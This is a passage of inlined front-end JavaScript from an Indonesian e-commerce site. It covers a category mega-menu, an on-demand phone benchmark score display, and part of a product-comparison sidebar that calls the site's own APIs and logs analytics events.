      <nav class="mm2-subnav" role="tablist">
        ${children.map((c2,i)=>{
          const t = c2.label.split('/').slice(-1)[0];
          return `<button class="mm2-subitem${i===0?' active':''}" role="tab" data-idx="${i}" aria-selected="${i===0?'true':'false'}">${esc(t)}</button>`;
        }).join('')}
      </nav>` : '';

    const subcontent = `<div class="mm2-subcontent" data-mm2="subcontent"></div>`;

    detailView.innerHTML = `
      <div class="mm2-detail">
        <div class="mm2-detail-header">
          <button class="mm2-back" type="button" data-mm2="back" aria-label="Kembali">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="15 18 9 12 15 6"></polyline></svg>
          </button>
          <div class="mm2-detail-title">${esc(title)}</div>
        </div>

        ${hasChildren ? `
          <div class="mm2-detail-layout">
            ${subnav}
            ${subcontent}
          </div>` : `
          <div class="mm2-links">
            <a class="mm2-link mm2-seeall" href="/product/kategori/?kategori_path=${encodeURIComponent(node.path)}" data-mm2="nav" data-path="${esc(node.path)}" data-label="${esc(node.label)}">
              <strong>Lihat semua ${esc(title)}</strong>
            </a>
          </div>
        `}
      </div>
    `;

    topView.classList.remove('is-active');
    detailView.classList.add('is-active');

    if (hasChildren) {
      const subEl  = detailView.querySelector('.mm2-subnav');
      const contEl = detailView.querySelector('[data-mm2="subcontent"]');
      let activeIdx = 0;

      const renderSubgrid = (idx) => {
        const c2 = children[idx]; if (!c2) { contEl.innerHTML=''; return; }
        const title2 = c2.label.split('/').slice(-1)[0];
        const l3 = Array.isArray(c2.children) ? c2.children : [];
        const l3Html = l3.map(c3 => `
          <a class="mm2-link" href="/product/kategori/?kategori_path=${encodeURIComponent(c3.path)}" data-mm2="nav" data-path="${esc(c3.path)}" data-label="${esc(c3.label)}" data-cat-path="${esc(c3.path)}">
            <span class="mm2-link-text">${esc(c3.label.split('/').slice(-1)[0])}</span>
            <span class="mm2-thumbs" data-loading="true">
              <span class="mm2-thumb-skeleton"></span>
              <span class="mm2-thumb-skeleton"></span>
            </span>
          </a>`).join('');

        contEl.innerHTML = `
          <div class="mm2-links">
            <a class="mm2-link mm2-seeall" href="/product/kategori/?kategori_path=${encodeURIComponent(c2.path)}" data-mm2="nav" data-path="${esc(c2.path)}" data-label="${esc(c2.label)}">
              <strong>Lihat semua ${esc(title2)}</strong>
            </a>
            ${l3Html}
          </div>
        `;
        
        // Fetch product thumbnails for each level-3 category (desktop only)
        if (isDesktop()) {
          setTimeout(() => {
            l3.forEach(c3 => {
              fetchCategoryThumbnails(c3.path);
            });
          }, 100);
        }
      };

      renderSubgrid(activeIdx);

      // Desktop: hover ganti konten; Mobile & Desktop: click pilih
      subEl.addEventListener('mousemove', (e)=>{
        if (!isDesktop()) return;
        const it = e.target.closest('.mm2-subitem'); if (!it) return;
        const idx = +it.dataset.idx; if (!Number.isInteger(idx) || idx===activeIdx) return;
        subEl.querySelectorAll('.mm2-subitem').forEach(el=>el.classList.remove('active'));
        it.classList.add('active');
        subEl.querySelectorAll('.mm2-subitem').forEach(el=>el.setAttribute('aria-selected', el===it ? 'true':'false'));
        activeIdx = idx;
        renderSubgrid(activeIdx);
      });

      subEl.addEventListener('click', (e)=>{
        const it = e.target.closest('.mm2-subitem'); if (!it) return;
        const idx = +it.dataset.idx; if (!Number.isInteger(idx)) return;
        subEl.querySelectorAll('.mm2-subitem').forEach(el=>el.classList.remove('active'));
        it.classList.add('active');
        subEl.querySelectorAll('.mm2-subitem').forEach(el=>el.setAttribute('aria-selected', el===it ? 'true':'false'));
        activeIdx = idx;
        renderSubgrid(activeIdx);
      });

      // Delegate link clicks to add recent
      detailView.addEventListener('click', (e)=>{
        const nav = e.target.closest('[data-mm2="nav"]');
        if (nav) { saveRecent(nav.dataset.path, nav.dataset.label); }
      });
    }
  }

  function buildTop(){
    const html = data.map((n, idx) => {
      const title = n.label.split('/')[0];
      const childCount = (n.children||[]).length;
      const productCount = countProducts(n);
      const gradient = categoryGradients[idx % categoryGradients.length];
      
      // Dynamic subtitle based on content - shorter for mobile
      let sub = '';
      if (productCount > 0) {
        sub = `${productCount} produk`;
        if (childCount > 0) sub += ` Â· ${childCount} kat`;
      } else if (childCount > 0) {
        sub = `${childCount} kategori`;
      } else {
        sub = 'Lihat semua';
      }
      
      const iconStyle = `background: linear-gradient(135deg, ${gradient.from}, ${gradient.to}); border-color: ${gradient.border}; color: ${gradient.color};`;
      
      return `<a href="/product/kategori/?kategori_path=${encodeURIComponent(n.path)}" class="mm2-card" data-mm2="card" data-path="${esc(n.path)}" data-label="${esc(n.label)}">
        <span class="mm2-ico" style="${iconStyle}">${icon()}</span>
        <span style="flex: 1;">
          <div class="mm2-title">${esc(title)}</div>
          <div class="mm2-sub">${esc(sub)}</div>
        </span>
      </a>`;
    }).join('');
    const closeBtnHtml = !isDesktop() ? mobileCloseBtn() : '';
    topView.innerHTML = `<div class="mm2-top">${closeBtnHtml}<div class="mm2-grid">${html}</div></div>`;
  }

  // Open/close with safe-area
  trigger.addEventListener('click', (e)=>{ e.preventDefault(); document.body.classList.contains('mm2-open') ? close() : open(); });
  trigger.addEventListener('pointerenter', ()=>{ if (isDesktop()) { clearTimeout(closeTimer); hoverTimer=setTimeout(open, 80); }});
  trigger.addEventListener('pointerleave', (e)=>{ if (isDesktop() && !isToSafeArea(e)) { clearTimeout(hoverTimer); closeTimer=setTimeout(close, 200); }});
  panel.addEventListener('pointerenter', ()=>{ if (isDesktop()) clearTimeout(closeTimer); });
  panel.addEventListener('pointerleave', (e)=>{ if (isDesktop() && !isToSafeArea(e)) closeTimer=setTimeout(close, 200); });
  backdrop?.addEventListener('pointerenter', ()=>{ clearTimeout(closeTimer); });
  backdrop?.addEventListener('click', close);
  document.addEventListener('keydown', (e)=>{ if (e.key==='Escape') close(); });

  // Card click â†’ open detail (unless cmd/ctrl to open link)
  panel.addEventListener('click', (e)=>{
    const closeBtn = e.target.closest('[data-mm2="close"]'); if (closeBtn) { e.preventDefault(); close(); return; }
    const back = e.target.closest('[data-mm2="back"]'); if (back) { e.preventDefault(); showTop(); return; }
    const card = e.target.closest('[data-mm2="card"]');
    if (card && !e.metaKey && !e.ctrlKey) {
      e.preventDefault();
      const n = data.find(d => d.path === card.dataset.path);
      if (n) showDetail(n);
    }
    const nav = e.target.closest('[data-mm2="nav"]');
    if (nav) { saveRecent(nav.dataset.path, nav.dataset.label); }
  });

  // Swipe-down gesture for mobile (bottom sheet close)
  if (!isDesktop()) {
    let startY = 0, currentY = 0, isDragging = false, startTime = 0;
    const SWIPE_THRESHOLD = 80;
    const VELOCITY_THRESHOLD = 0.3;

    panel.addEventListener('touchstart', (e) => {
      if (!document.body.classList.contains('mm2-open')) return;
      const touch = e.touches[0];
      const scrollableContent = e.target.closest('.mm2-top, .mm2-detail');
      
      // Prevent drag if content is scrolled
      if (scrollableContent && scrollableContent.scrollTop > 5) return;
      
      // Only start drag from top area or handle
      const rect = panel.getBoundingClientRect();
      if (touch.clientY - rect.top > 60) return;
      
      startY = touch.clientY;
      currentY = startY;
      startTime = Date.now();
      isDragging = true;
    }, { passive: true });

    panel.addEventListener('touchmove', (e) => {
      if (!isDragging) return;
      const touch = e.touches[0];
      currentY = touch.clientY;
      const deltaY = currentY - startY;
      
      // Only allow downward swipe
      if (deltaY > 0) {
        const opacity = Math.max(0.4, 1 - (deltaY / 300));
        panel.style.transform = `translateX(0) translateY(${deltaY}px)`;
        panel.style.opacity = opacity;
      }
    }, { passive: true });

    const endDrag = () => {
      if (!isDragging) return;
      const deltaY = currentY - startY;
      const deltaTime = Date.now() - startTime;
      const velocity = deltaY / deltaTime;
      
      // Close if swiped down enough or fast swipe
      if (deltaY > SWIPE_THRESHOLD || velocity > VELOCITY_THRESHOLD) {
        close();
      }
      
      // Reset position
      panel.style.transform = '';
      panel.style.opacity = '';
      isDragging = false;
    };

    panel.addEventListener('touchend', endDrag, { passive: true });
    panel.addEventListener('touchcancel', endDrag, { passive: true });
  }

  // Fetch data with loading state
  if (!isLoading) {
    isLoading = true;
    showLoading();
    
    fetch(apiUrl, { headers: { 'Accept': 'application/json' }})
      .then(r => {
        if (!r.ok) throw new Error('Network response was not ok');
        return r.json();
      })
      .then(j => { 
        data = Array.isArray(j.data) ? j.data : []; 
        if (!data.length) {
          topView.innerHTML = `<div class="mm2-top"><div style="text-align:center;padding:40px;color:var(--mm2-fg-muted);">
            <p>Tidak ada kategori tersedia</p>
          </div></div>`;
          return;
        }
        buildTop();
        isLoading = false;
      })
      .catch(err => {
        console.error('Failed to load categories:', err);
        topView.innerHTML = `<div class="mm2-top"><div style="text-align:center;padding:40px;color:var(--mm2-fg-muted);">
          <p>Gagal memuat kategori. Silakan coba lagi.</p>
        </div></div>`;
        isLoading = false;
      });
  }
})();

// Add skeleton animation styles
const style = document.createElement('style');
style.textContent = `
.mm2-skeleton {
  pointer-events: none;
  animation: pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite;
}
.skeleton-box, .skeleton-line {
  background: linear-gradient(90deg, #f1f5f9 25%, #e2e8f0 50%, #f1f5f9 75%);
  background-size: 200% 100%;
  animation: shimmer 1.5s infinite;
  border-radius: 8px;
}
@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.6; }
}
@keyframes shimmer {
  0% { background-position: 200% 0; }
  100% { background-position: -200% 0; }
}
`;
document.head.appendChild(style);
</script>
    <script data-inlined="benchmark.js">
/**
 * Benchmark Data Loader
 * Handles AJAX fetch and display of benchmark data
 */

(function() {
    'use strict';
    
    // Wait for DOM ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initBenchmark);
    } else {
        initBenchmark();
    }
    
    function initBenchmark() {
        const section = document.querySelector('.pd-benchmark-section');
        if (!section) return;
        
        const button = document.getElementById('btn-load-benchmark');
        const content = document.getElementById('benchmark-content');
        const productId = section.dataset.productId;
        
        if (!button || !content || !productId) return;
        
        let isLoading = false;
        let dataLoaded = false;
        
        button.addEventListener('click', function() {
            if (isLoading || dataLoaded) return;
            
            loadBenchmarkData(productId, button, content);
        });
    }
    
    function loadBenchmarkData(productId, button, container) {
        // Update button state
        button.disabled = true;
        button.classList.add('loading');
        const originalText = button.querySelector('.btn-text').textContent;
        button.querySelector('.btn-text').textContent = 'Memuat data...';
        
        // Show loading state
        container.style.display = 'block';
        container.innerHTML = `
            <div class="benchmark-loading">
                <div class="benchmark-loading-spinner"></div>
                <p>Mengambil data benchmark...</p>
            </div>
        `;
        
        // Fetch data
        fetch('/api/benchmark/fetch.php?product_id=' + productId)
            .then(function(response) {
                if (!response.ok) {
                    throw new Error('HTTP error ' + response.status);
                }
                return response.json();
            })
            .then(function(result) {
                if (result.success && result.data) {
                    renderBenchmarkData(result.data, container);
                    button.style.display = 'none'; // Hide button after successful load
                } else {
                    throw new Error(result.error || 'Data tidak tersedia');
                }
            })
            .catch(function(error) {
                console.error('Benchmark fetch error:', error);
                container.innerHTML = `
                    <div class="benchmark-error">
                        <p><strong>âš ï¸ Data Benchmark Tidak Tersedia</strong></p>
                        <p style="font-size: 14px; margin-top: 8px;">
                            ${error.message || 'Terjadi kesalahan saat memuat data'}
                        </p>
                        <button type="button" onclick="location.reload()" 
                                style="margin-top: 16px; padding: 8px 20px; background: #667eea; color: #fff; border: none; border-radius: 6px; cursor: pointer;">
                            Coba Lagi
                        </button>
                    </div>
                `;
                
                // Reset button
                button.disabled = false;
                button.classList.remove('loading');
                button.querySelector('.btn-text').textContent = originalText;
            });
    }
    
    function renderBenchmarkData(data, container) {
        let html = '<div class="benchmark-data-wrapper">';
        
        // Chipset info if available
        if (data.chipset) {
            html += `
                <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 10px 16px; border-radius: 8px; margin-bottom: 12px;">
                    <div style="font-size: 11px; opacity: 0.85; margin-bottom: 2px;">Chipset</div>
                    <div style="font-size: 15px; font-weight: 600;">${escapeHtml(data.chipset)}</div>
                </div>
            `;
        }
        
        // Main benchmark scores
        if (data.antutu || data.geekbench_multi || data.overall_score) {
            html += '<div class="benchmark-data-grid">';
            
            if (data.antutu) {
                html += `
                    <div class="benchmark-card">
                        <div class="benchmark-card-label">ANTUTU</div>
                        <div class="benchmark-card-value large">${formatNumber(data.antutu)}</div>
                        ${getScoreBadge(data.antutu, 'antutu')}
                    </div>
                `;
            }
            
            if (data.geekbench_multi) {
                html += `
                    <div class="benchmark-card">
                        <div class="benchmark-card-label">GEEKBENCH MULTI</div>
                        <div class="benchmark-card-value">${formatNumber(data.geekbench_multi)}</div>
                        ${data.geekbench_single ? '<div class="benchmark-card-subtitle">Single: ' + formatNumber(data.geekbench_single) + '</div>' : ''}
                    </div>
                `;
            }
            
            if (data.gaming_score) {
                html += `
                    <div class="benchmark-card">
                        <div class="benchmark-card-label">GAMING</div>
                        <div class="benchmark-card-value">${data.gaming_score}<span style="font-size: 14px; opacity: 0.6;">/100</span></div>
                    </div>
                `;
            }
            
            if (data.battery_score) {
                html += `
                    <div class="benchmark-card">
                        <div class="benchmark-card-label">BATTERY</div>
                        <div class="benchmark-card-value">${data.battery_score}<span style="font-size: 14px; opacity: 0.6;">/100</span></div>
                    </div>
                `;
            }
            
            if (data.overall_score) {
                html += `
                    <div class="benchmark-card">
                        <div class="benchmark-card-label">OVERALL</div>
                        <div class="benchmark-card-value">${data.overall_score}<span style="font-size: 14px; opacity: 0.6;">/100</span></div>
                    </div>
                `;
            }
            
            html += '</div>';
        }
        
        // AI Performance Description
        if (data.notes) {
            html += `
                <div style="background: #f8f9fa; border-left: 3px solid #667eea; padding: 10px 14px; border-radius: 6px; margin-top: 12px;">
                    <div style="font-size: 11px; font-weight: 600; color: #667eea; margin-bottom: 6px;">ðŸ’¡ Analisis Performa</div>
                    <div style="font-size: 13px; color: #4a5568; line-height: 1.5;">${escapeHtml(data.notes)}</div>
                </div>
            `;
        }
        
        // Attribution
        html += `
            <div class="benchmark-attribution">
                <p style="font-size: 11px; margin: 8px 0 0 0; color: #888;">Data benchmark dianalisis menggunakan AI dari spesifikasi produk</p>
                ${data.fetched_at ? '<p style="font-size: 10px; margin: 4px 0 0 0; color: #aaa;">Terakhir diperbarui: ' + formatDate(data.fetched_at) + '</p>' : ''}
            </div>
        `;
        
        html += '</div>';
        
        container.innerHTML = html;
    }
    
    function formatNumber(num) {
        if (!num) return '-';
        return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');
    }
    
    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    
    function formatDate(dateStr) {
        try {
            const date = new Date(dateStr);
            const options = { year: 'numeric', month: 'long', day: 'numeric' };
            return date.toLocaleDateString('id-ID', options);
        } catch (e) {
            return dateStr;
        }
    }
    
    function getScoreBadge(score, type) {
        let category = '';
        let label = '';
        
        if (type === 'antutu') {
            if (score >= 500000) {
                category = 'excellent';
                label = 'Flagship';
            } else if (score >= 350000) {
                category = 'good';
                label = 'High-End';
            } else if (score >= 200000) {
                category = 'average';
                label = 'Mid-Range';
            } else {
                category = 'average';
                label = 'Entry-Level';
            }
        }
        
        if (label) {
            return '<div class="benchmark-score-badge ' + category + '">' + label + '</div>';
        }
        
        return '';
    }
})();

</script>
  <script data-inlined="product-compare.js">
(function() {
  'use strict';
  
  // State management
  let compareList = [];
  let isAnalyzing = false;
  let currentAnalysis = null;
  
  // DOM elements
  const compareBtn = document.getElementById('compareBtn');
  const compareSidebar = document.getElementById('compareSidebar');
  const compareOverlay = document.getElementById('compareOverlay');
  const compareClose = document.getElementById('compareClose');
  const compareModal = document.getElementById('aiCompareModal');
  const compareModalClose = document.getElementById('aiCompareModalClose');
  
  // Initialize
  document.addEventListener('DOMContentLoaded', async function() {
    await initializeCompare();
    setupEventListeners();
  });
  
  /**
   * Initialize compare functionality
   */
  async function initializeCompare() {
    // Load compare list first before setting up buttons
    await loadCompareList();
    
    // Setup product detail compare button if exists
    const productCompareBtn = document.getElementById('pd-compare-btn');
    
    if (productCompareBtn) {
      setupProductCompareButton(productCompareBtn);
    }
    
    // Check for existing compare list and update UI
    if (compareList.length > 0) {
      // Only update badge and buttons, no sticky bar
    }
  }
  
  /**
   * Setup event listeners
   */
  function setupEventListeners() {
    // Navigation compare button
    if (compareBtn) {
      compareBtn.addEventListener('click', toggleCompareSidebar);
    }
    
    // Sidebar controls
    if (compareClose) {
      compareClose.addEventListener('click', closeCompareSidebar);
    }
    
    if (compareOverlay) {
      compareOverlay.addEventListener('click', closeCompareSidebar);
    }
    
    // Sidebar actions
    const clearAllBtn = document.getElementById('compareClearAll');
    if (clearAllBtn) {
      clearAllBtn.addEventListener('click', clearAllProducts);
    }
    
    const analyzeBtn = document.getElementById('compareAnalyze');
    if (analyzeBtn) {
      analyzeBtn.addEventListener('click', startAIAnalysis);
    }
    
    // Modal controls
    if (compareModalClose) {
      compareModalClose.addEventListener('click', closeModal);
    }
    
    const modalBackdrop = compareModal?.querySelector('.modal-backdrop');
    if (modalBackdrop) {
      modalBackdrop.addEventListener('click', closeModal);
    }
    
    // Modal actions
    const retryBtn = document.getElementById('aiRetry');
    if (retryBtn) {
      retryBtn.addEventListener('click', startAIAnalysis);
    }
    
    // Removed share and add to cart buttons - replaced with AI disclaimer
  }
  
  /**
   * Setup product detail compare button
   */
  function setupProductCompareButton(button) {
    const productId = parseInt(button.dataset.productId);
    if (!productId) return;
    
    // Check if product is already in compare list
    updateProductCompareButtonState(button, productId);
    
    button.addEventListener('click', async function() {
      // Get current variant ID (if any)
      const variantIdElement = document.getElementById('pd-variant-id');
      const variantId = variantIdElement ? parseInt(variantIdElement.value) || 0 : 0;
      
      // Update button's variant data for current selection
      button.dataset.variantId = variantId.toString();
      
      await toggleProductInCompare(productId, button, variantId);
    });
  }
  
  /**
   * Toggle product in compare list
   */
  async function toggleProductInCompare(productId, button, variantId = 0) {
    // Check by product ID (variants of same product treated as same item)
    const isInCompare = compareList.some(p => parseInt(p.id) === parseInt(productId));
    
    try {
      if (isInCompare) {
        await removeFromCompare(productId);
        showToast('Produk dihapus dari perbandingan', 'success');
      } else {
        await addToCompare(productId, variantId);
        showToast('Produk ditambahkan ke perbandingan', 'success');
        
        // Trigger fly-to-compare animation
        triggerFlyToCompareAnimation(button);
      }
      
      updateProductCompareButtonState(button, productId);
      updateCompareBadge();
      updateAllCompareButtons();
      
    } catch (error) {
      showToast(error.message || 'Terjadi kesalahan', 'error');
    }
  }
  
  /**
   * Update product compare button state
   */
  function updateProductCompareButtonState(button, productId) {
    // Ensure both IDs are compared as integers
    const isInCompare = compareList.some(p => parseInt(p.id) === parseInt(productId));
    button.classList.toggle('added', isInCompare);
    
    // Handle visibility of text elements
    const compareText = button.querySelector('.compare-text');
    const compareRemove = button.querySelector('.compare-remove');
    const compareNote = document.getElementById('compare-note');
    
    if (compareText) {
      compareText.style.display = isInCompare ? 'none' : 'inline';
    }
    
    if (compareRemove) {
      if (isInCompare) {
        compareRemove.removeAttribute('hidden');
        compareRemove.style.display = 'flex';
      } else {
        compareRemove.setAttribute('hidden', '');
        compareRemove.style.display = 'none';
      }
    }
    
    // Update info note
    if (compareNote) {
      if (isInCompare) {
        const currentCount = compareList.length;
        compareNote.textContent = `Produk sudah ada di daftar perbandingan (${currentCount}/5). Klik tombol untuk menghapus.`;
      } else {
        compareNote.textContent = 'Bandingkan hingga 5 produk dengan bantuan AI';
      }
    }
    
    // Inline compare preview removed - keeping it simple
  }
  
  /**
   * Add product to compare list
   */
  async function addToCompare(productId, variantId = 0) {
    const requestData = { product_id: productId };
    if (variantId > 0) {
      requestData.variant_id = variantId;
    }
    
    const response = await fetch('/api/compare/add.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(requestData),
      credentials: 'same-origin'
    });
    
    const result = await response.json();
    
    if (!result.success) {
      throw new Error(result.error || 'Gagal menambahkan produk');
    }
    
    // Send Google Analytics event for add to compare
    if (typeof gtag === 'function') {
      gtag('event', 'add_to_compare', {
        event_category: 'Product Compare',
        event_label: 'Product Added to Compare',
        product_id: productId,
        variant_id: variantId || 0,
        custom_map: {
          custom_parameter_1: 'compare_add_product'
        }
      });
    }
    
    await loadCompareList();
    return result;
  }
  
  /**
   * Remove product from compare list
   */
  async function removeFromCompare(productId) {
    const response = await fetch('/api/compare/remove.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ product_id: productId }),
      credentials: 'same-origin'
    });
    
    const result = await response.json();
    
    if (!result.success) {
      throw new Error(result.error || 'Gagal menghapus produk');
    }
    
    // Send Google Analytics event for remove from compare
    if (typeof gtag === 'function') {
      gtag('event', 'remove_from_compare', {
        event_category: 'Product Compare',
        event_label: 'Product Removed from Compare',
        product_id: productId,
        custom_map: {
          custom_parameter_1: 'compare_remove_product'
        }
      });
    }
    
    await loadCompareList();
    return result;
  }
  
  /**
   * Clear all products from compare list
   */
  async function clearAllProducts() {
    if (compareList.length === 0) return;
    
    // Show confirmation modal
    const confirmed = await showConfirmModal({
      title: 'Hapus Semua Produk',
      message: 'Apakah Anda yakin ingin menghapus semua produk dari daftar perbandingan?',
      confirmText: 'Hapus Semua',
      cancelText: 'Batal',
      type: 'danger'
    });
    
    if (!confirmed) return;
    
    try {
      const response = await fetch('/api/compare/clear.php', {
        method: 'POST',
        credentials: 'same-origin'
      });
      
      const result = await response.json();
      
      if (!result.success) {
        throw new Error(result.error || 'Gagal menghapus produk');
      }
      
      // Send Google Analytics event for clear all products
      if (typeof gtag === 'function') {
        gtag('event', 'compare_clear_all', {
          event_category: 'Product Compare',
          event_label: 'Clear All Products',
          products_count: compareList.length,
          custom_map: {
            custom_parameter_1: 'compare_clear_action'
          }
        });
      }
      
      await loadCompareList();
      showToast('Semua produk dihapus dari perbandingan', 'success');
      
    } catch (error) {
      showToast(error.message || 'Terjadi kesalahan', 'error');
    }
  }
  
  /**
   * Load compare list from server
   */
  async function loadCompareList() {
    try {
      const response = await fetch('/api/compare/get.php', {
        credentials: 'same-origin'
      });
      
      const result = await response.json();
      
      if (result.success) {
        compareList = result.products || [];
        updateCompareSidebar();
        updateCompareBadge();
        updateAllCompareButtons();
      }
      
    } catch (error) {
      // Silently handle error - compare functionality will work with empty list
    }
  }
  
  /**
   * Update compare sidebar content
   */
  function updateCompareSidebar() {
    const emptyState = document.getElementById('compareEmpty');
    const listContainer = document.getElementById('compareList');
    const actionsContainer = document.getElementById('compareActions');
    const countElement = document.getElementById('compareCountSidebar');
    
    if (!emptyState || !listContainer || !actionsContainer || !countElement) return;
    
    // Update count
    countElement.textContent = `(${compareList.length})`;
    
    if (compareList.length === 0) {
      emptyState.style.display = 'block';
      listContainer.style.display = 'none';
      actionsContainer.style.display = 'none';
    } else {
      emptyState.style.display = 'none';
      listContainer.style.display = 'block';
      actionsContainer.style.display = 'flex';
      
      // Render product list
      listContainer.innerHTML = compareList.map(product => {
        // Display variant name if available
        let displayName = product.name;
        if (product.combination_name) {
          displayName += ` (${product.combination_name})`;
        }
        
        // Use variant price if available
        let displayPrice = product.price;
        if (product.variant_price !== undefined && product.variant_price !== null) {
          displayPrice = product.variant_price;
        }
        
        return `
          <div class="compare-item" data-product-id="${product.id}">
            <div class="compare-item-image">
              <img src="${product.image_url}" alt="${escapeHtml(displayName)}" loading="lazy">
            </div>
            <div class="compare-item-info">
              <div class="compare-item-name">${escapeHtml(displayName)}</div>
              <div class="compare-item-price">${formatPrice(displayPrice)}</div>
            </div>
            <button class="compare-item-remove" data-product-id="${product.id}" aria-label="Hapus">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                <path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"/>
              </svg>
            </button>
          </div>
        `;
      }).join('');
      
      // Setup event listeners for remove buttons
      setupRemoveButtons();
      
      // Update analyze button state
      const analyzeBtn = document.getElementById('compareAnalyze');
      if (analyzeBtn) {
        analyzeBtn.disabled = compareList.length < 2;
      }
    }
  }
  
  /**
   * Setup remove buttons event listeners
   */
  function setupRemoveButtons() {
    const removeButtons = document.querySelectorAll('.compare-item-remove');
    removeButtons.forEach(button => {
      button.addEventListener('click', async (e) => {
        e.preventDefault();
        const productId = parseInt(button.dataset.productId);
        if (productId) {
          await removeProduct(productId);
        }
      });
    });
  }

  /**
   * Update all compare buttons on the page
   */
  function updateAllCompareButtons() {
    // Update product detail compare button
    const productBtn = document.getElementById('pd-compare-btn');
    if (productBtn) {
      const productId = parseInt(productBtn.dataset.productId);
      if (productId) {
        updateProductCompareButtonState(productBtn, productId);
      }
    }
    
    // Update any other compare buttons on the page
    const allCompareButtons = document.querySelectorAll('[data-product-id][class*="compare"]');
    allCompareButtons.forEach(button => {
      const productId = parseInt(button.dataset.productId);
      if (productId && button.id !== 'pd-compare-btn') {
        updateProductCompareButtonState(button, productId);
      }
    });
  }

  /**
   * Update compare badge
   */
  function updateCompareBadge() {
    const badge = document.getElementById('compareCount');
    if (!badge) return;
    
    const oldCount = parseInt(badge.textContent) || 0;
    const newCount = compareList.length;
    
    badge.textContent = newCount;
    badge.classList.toggle('active', newCount > 0);
    
    // Animate badge if count increased
    if (newCount > oldCount) {
      animateCompareBadge();
      highlightCompareButton();
    }
    
    // Sticky bar removed - keeping only fly-to-navbar animation
  }
  
  /**
   * Animate compare badge when new product added
   */
  function animateCompareBadge() {
    const badge = document.getElementById('compareCount');
    if (!badge) return;
    
    badge.style.transform = 'scale(1.3)';
    badge.style.transition = 'transform 0.3s ease';
    
    setTimeout(() => {
      badge.style.transform = 'scale(1)';
    }, 300);
  }
  
  /**
   * Highlight compare button temporarily
   */
  function highlightCompareButton() {
    const compareBtn = document.getElementById('compareBtn');
    if (!compareBtn) return;
    
    compareBtn.classList.add('pulse-highlight');
    
    setTimeout(() => {
      compareBtn.classList.remove('pulse-highlight');
    }, 3000);
  }
  
  /**
   * Trigger fly-to-compare animation
   */
  function triggerFlyToCompareAnimation(sourceButton) {
    if (!sourceButton) {
      return;
    }
    
    // Check if mobile view (bottom nav) or desktop (top nav)
    const isMobile = window.innerWidth <= 768;
    
    // Get source position
    const sourceRect = sourceButton.getBoundingClientRect();
    
    // Calculate target position
    let targetTop, targetLeft;
    
    if (isMobile) {
      // Mobile: fly to fixed bottom position (bottom nav area)
      // Use fixed coordinates regardless of bottom nav visibility
      targetTop = window.innerHeight - 80; // Just above bottom nav area
      targetLeft = window.innerWidth / 2 - 30; // Center horizontally
    } else {
      // Desktop: fly to top navbar compare button
      const targetElement = document.getElementById('compareBtn');
      if (!targetElement) {
        return;
      }
      const targetRect = targetElement.getBoundingClientRect();
      targetTop = targetRect.top + 10;
      targetLeft = targetRect.left + 10;
    }
    
    // Get product image for animation - try multiple selectors
    let productImage = document.querySelector('#pd-main-img, .product-gallery img, .pd-image img, .product-image img, .product-main-image img, img[alt*="produk"], img[src*="product"]');
    
    // Create animated element
    const flyingElement = document.createElement('div');
    flyingElement.className = 'flying-product';
    
    if (productImage) {
      flyingElement.innerHTML = `<img src="${productImage.src}" alt="Flying product">`;
      flyingElement.querySelector('img').style.cssText = `
        width: 100%;
        height: 100%;
        object-fit: cover;
        border-radius: 8px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      `;
    } else {
      // Fallback: colored div with icon
      flyingElement.innerHTML = `<div class="flying-fallback">ðŸ“¦</div>`;
      flyingElement.querySelector('.flying-fallback').style.cssText = `
        width: 100%;
        height: 100%;
        background: #3b82f6;
        border-radius: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      `;
    }
    
    flyingElement.style.cssText = `
      position: fixed;
      top: ${sourceRect.top}px;
      left: ${sourceRect.left}px;
      width: 60px;
      height: 60px;
      z-index: 9999;
      pointer-events: none;
      opacity: 1;
      transform: scale(1);
    `;
    
    document.body.appendChild(flyingElement);
    
    // Use Web Animations API for more reliable animation
    flyingElement.animate([
      // Keyframe 1: Initial state
      {
        top: `${sourceRect.top}px`,
        left: `${sourceRect.left}px`,
        transform: 'scale(1)',
        opacity: 1
      },
      // Keyframe 2: Final state
      {
        top: `${targetTop}px`,
        left: `${targetLeft}px`,
        transform: 'scale(0.3)',
        opacity: 0
      }
    ], {
      duration: 800,
      easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)',
      fill: 'forwards'
    });
    
    // Clean up after animation completes
    setTimeout(() => {
      if (flyingElement.parentNode) {
        flyingElement.parentNode.removeChild(flyingElement);
      }
    }, 850);
  }
  
  // Sticky compare bar functions removed - using only fly-to-navbar animation
  
  /**
   * Toggle compare sidebar
   */
  function toggleCompareSidebar() {
    if (!compareSidebar) return;
    
    const isOpen = compareSidebar.classList.contains('open');
    
    if (isOpen) {
      closeCompareSidebar();
    } else {
      openCompareSidebar();
    }
  }
  
  /**
   * Open compare sidebar
   */
  function openCompareSidebar() {
    if (!compareSidebar || !compareOverlay) return;
    
    compareSidebar.classList.add('open');
    compareOverlay.classList.add('active');
    document.body.style.overflow = 'hidden';
    
    // Send Google Analytics event for compare sidebar open
    if (typeof gtag === 'function') {
      gtag('event', 'compare_sidebar_open', {
        event_category: 'Product Compare',
        event_label: 'Compare Sidebar Opened',
        products_count: compareList.length,
        custom_map: {
          custom_parameter_1: 'compare_sidebar_view'
        }
      });
    }
  }
  
  /**
   * Close compare sidebar
   */
  function closeCompareSidebar() {
    if (!compareSidebar || !compareOverlay) return;
    
    compareSidebar.classList.remove('open');
    compareOverlay.classList.remove('active');
    document.body.style.overflow = '';
  }
  
  /**
   * Start AI analysis
   */
